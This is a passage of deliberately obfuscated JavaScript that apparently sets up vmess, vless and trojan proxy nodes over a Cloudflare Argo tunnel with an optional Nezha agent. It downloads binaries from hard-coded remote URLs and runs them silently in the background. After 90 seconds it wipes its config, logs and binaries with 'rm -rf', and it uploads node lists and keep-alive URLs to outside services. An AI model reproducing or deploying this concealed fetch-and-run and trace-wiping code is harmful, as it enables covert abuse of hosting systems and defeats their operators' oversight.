axios[_0x32a5c8(0x158)](UPLOAD_URL+_0x1a81cf(0xff),_0x26f47f,{'headers':{'Content-Type':_0x32a5c8(0x198)}});return _0x5cf120&&_0x5cf120[_0x32a5c8(0x1a7)]===0xc8?(console[_0x32a5c8(0x17d)](_0x32a5c8(0x1ad)),_0x5cf120):null;}catch(_0x19ceb2){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x19a4ce=_0x4a6f,_0x2ded60=_0xa0e7,_0x5dca0a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5dca0a[_0x2ded60(0x1bf)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5dca0a[_0x19a4ce(0x155)](phpPath);process[_0x2ded60(0x17a)]===_0x2ded60(0x1a2)?exec(_0x19a4ce(0x179)+_0x5dca0a[_0x2ded60(0x1f2)]('\x20')+_0x19a4ce(0x140),_0x4fdb3d=>{const _0x171d7c=_0x19a4ce,_0x14e63e=_0x2ded60;console[_0x14e63e(0x1aa)](),console[_0x14e63e(0x17d)](_0x171d7c(0x15f)),console[_0x171d7c(0x12d)](_0x14e63e(0x1a5));}):exec('rm\x20-rf\x20'+_0x5dca0a[_0x2ded60(0x1f2)]('\x20')+_0x19a4ce(0xea),_0x25bc71=>{const _0xc6a38c=_0x19a4ce,_0x2519d2=_0x2ded60;console[_0x2519d2(0x1aa)](),console[_0x2519d2(0x17d)](_0xc6a38c(0x15f)),console[_0x2519d2(0x17d)](_0x2519d2(0x1a5));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1197c7=_0x288961,_0x94bf8=_0x3d992e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x94bf8(0x17d)](_0x94bf8(0x187));return;}try{const _0x59e2fc=await axios[_0x94bf8(0x158)](_0x94bf8(0x203),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1197c7(0xf1)}});return console[_0x94bf8(0x17d)](_0x1197c7(0x137)),_0x59e2fc;}catch(_0x2cd0e8){return console['error'](_0x94bf8(0x1e6)+_0x2cd0e8[_0x94bf8(0x15b)]),null;}}async function startserver(){const _0x4e7933=_0x3d992e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x58b099){console[_0x4e7933(0x188)](_0x4e7933(0x174),_0x58b099);}}function _0x427c(){const _0x1fb075=_0x288961,_0x26402c=[_0x1fb075(0x174),_0x1fb075(0x197),'/api/delete-nodes',_0x1fb075(0x189),'createWriteStream',_0x1fb075(0x190),_0x1fb075(0x115),_0x1fb075(0x135),'text/plain;\x20charset=utf-8',_0x1fb075(0x15d),'/vmess-argo','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',_0x1fb075(0x145),_0x1fb075(0x114),_0x1fb075(0x184),'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',_0x1fb075(0x15a),_0x1fb075(0x195),'Error\x20executing\x20command:\x20','Nodes\x20uploaded\x20successfully',_0x1fb075(0x18b),_0x1fb075(0x16f),'countryCode',_0x1fb075(0x180),_0x1fb075(0xe7),'child_process','path',_0x1fb075(0xf7),_0x1fb075(0x162),_0x1fb075(0xe8),_0x1fb075(0x122),'none',_0x1fb075(0x17e),'Download\x20',_0x1fb075(0xe2),_0x1fb075(0x12b),_0x1fb075(0x104),'push',_0x1fb075(0x123),_0x1fb075(0xdf),_0x1fb075(0xe6),_0x1fb075(0x10a),_0x1fb075(0x149),_0x1fb075(0xfb),'length','2096',_0x1fb075(0x18e),_0x1fb075(0x12c),_0x1fb075(0x188),_0x1fb075(0x18a),'PORT',_0x1fb075(0x10e),_0x1fb075(0x142),_0x1fb075(0x14c),_0x1fb075(0x17d),'boot.log',_0x1fb075(0x16e),_0x1fb075(0xec),_0x1fb075(0x10f),'org',_0x1fb075(0xfc),_0x1fb075(0x13f),'5995612YoznGj','&path=%2Ftrojan-argo%3Fed%3D2560#',_0x1fb075(0x14a),_0x1fb075(0x131),_0x1fb075(0xf3),_0x1fb075(0x167),_0x1fb075(0x187),'unlinkSync',_0x1fb075(0x10d),_0x1fb075(0xe1),_0x1fb075(0x154),'https://arm64.ssss.nyc.mn/web',_0x1fb075(0x178),_0x1fb075(0x159),'Add\x20automatic\x20access\x20task\x20faild:\x20',_0x1fb075(0x18c),_0x1fb075(0x13a),_0x1fb075(0xdd),_0x1fb075(0x166),_0x1fb075(0x14b),_0x1fb075(0x136),_0x1fb075(0x13d),_0x1fb075(0x134),'Error\x20downloading\x20files:',_0x1fb075(0x17a),_0x1fb075(0x128),_0x1fb075(0x100),_0x1fb075(0x18d),_0x1fb075(0x116),_0x1fb075(0x173),_0x1fb075(0x172),_0x1fb075(0xe4),_0x1fb075(0x146),'443',_0x1fb075(0xfa),_0x1fb075(0x124),_0x1fb075(0xdc),_0x1fb075(0x112),_0x1fb075(0x168),'hubstar.ttd.de5.net','fileName',_0x1fb075(0xe5),'\x20>/dev/null\x202>&1\x20&','https://oooo.serv00.net/add-url',_0x1fb075(0x153),_0x1fb075(0x175),_0x1fb075(0x150),_0x1fb075(0x14f),_0x1fb075(0x185),'send','php\x20running\x20error:\x20',_0x1fb075(0x132),_0x1fb075(0x12e),_0x1fb075(0x120),_0x1fb075(0x141),_0x1fb075(0x11d),_0x1fb075(0x171),'/vless-argo',_0x1fb075(0x143),_0x1fb075(0x119),_0x1fb075(0xf0),_0x1fb075(0x148),_0x1fb075(0xee),'NEZHA_KEY','http://ip-api.com/json/','/tunnel.yml\x20run','Subscription\x20uploaded\x20successfully',_0x1fb075(0xfe),_0x1fb075(0x161),_0x1fb075(0xe9),_0x1fb075(0x169),'NEZHA\x20variable\x20is\x20empty,skip\x20running',_0x1fb075(0x126),_0x1fb075(0x11f),_0x1fb075(0xe3),_0x1fb075(0x103),'util',_0x1fb075(0xf2),'unlink','TunnelSecret','CFPORT',_0x1fb075(0x156),_0x1fb075(0x106),_0x1fb075(0x16b),_0x1fb075(0x130),_0x1fb075(0x163),_0x1fb075(0x121),'/dev/null','base64','https://amd64.ssss.nyc.mn/web',_0x1fb075(0x14d),_0x1fb075(0x101),'platform','web\x20running\x20error:\x20','https://arm64.ssss.nyc.mn/v1',_0x1fb075(0x12d),_0x1fb075(0x118),_0x1fb075(0x198),_0x1fb075(0x194),_0x1fb075(0x105),_0x1fb075(0x192),'utf-8',_0x1fb075(0xf5),'\x0a\x0avmess://',_0x1fb075(0xe0),'Skipping\x20adding\x20automatic\x20access\x20task','error','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',_0x1fb075(0x151),'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','hubstar',_0x1fb075(0x15c),_0x1fb075(0x183),_0x1fb075(0x191),_0x1fb075(0x11a),_0x1fb075(0xed),_0x1fb075(0xf4),_0x1fb075(0x10b),'a2e06bae-ddf0-45dd-ba79-af90e0b68b60',_0x1fb075(0x177),_0x1fb075(0x158),_0x1fb075(0x11c),_0x1fb075(0xf1)];return _0x427c=function(){return _0x26402c;},_0x427c();}startserver()[_0x3d992e(0x1ae)](_0x348b7d=>{const _0x26aafe=_0x3d992e;console[_0x26aafe(0x188)](_0x26aafe(0x197),_0x348b7d);}),app[_0x288961(0x193)](PORT,()=>console[_0x3d992e(0x17d)](_0x288961(0xf8)+PORT+'!'));
